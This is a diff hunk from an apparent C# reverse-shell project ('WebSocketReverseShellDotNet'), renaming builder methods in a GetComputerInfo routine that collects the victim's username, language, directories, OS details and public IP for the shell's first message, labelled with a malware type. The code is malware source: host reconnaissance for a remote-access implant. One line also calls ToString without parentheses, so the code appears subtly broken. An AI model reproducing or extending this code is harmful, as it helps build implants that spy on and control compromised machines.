@@ -13,16 +13,16 @@ namespace WebSocketReverseShellDotNet.utils
         public static ReverseShellInfoInitialMessage GetComputerInfo()
         {
             return new ReverseShellInfoInitialMessageBuilder()
-                .WithUserName(Environment.UserName)
-                .WithUserLanguage(System.Globalization.CultureInfo.CurrentCulture.Name)
-                .WithUserCurrentWorkingDir(Environment.CurrentDirectory)
-                .WithUserHome(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
-                .WithOsName(System.Runtime.InteropServices.RuntimeInformation.OSDescription)
-                .WithOsArch(System.Runtime.InteropServices.RuntimeInformation.OSArchitecture.ToString())
-                .WithOsVersion(Environment.OSVersion.ToString)
-                .WithUserPublicIp(GetPublicIp())
-                .WithMalwareType("C#")
-                .WithReply("Success") // Assuming a default reply
+                .WithuserName(Environment.UserName)
+                .WithuserLanguage(System.Globalization.CultureInfo.CurrentCulture.Name)
+                .WithuserCurrentWorkingDir(Environment.CurrentDirectory)
+                .WithuserHome(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
+                .WithosName(System.Runtime.InteropServices.RuntimeInformation.OSDescription)
+                .WithosArch(System.Runtime.InteropServices.RuntimeInformation.OSArchitecture.ToString())
+                .WithosVersion(Environment.OSVersion.ToString)
+                .WithuserPublicIp(GetPublicIp())
+                .WithmalwareType("C#")
+                .Withreply("Success") // Assuming a default reply
                 .Build();
         }
 
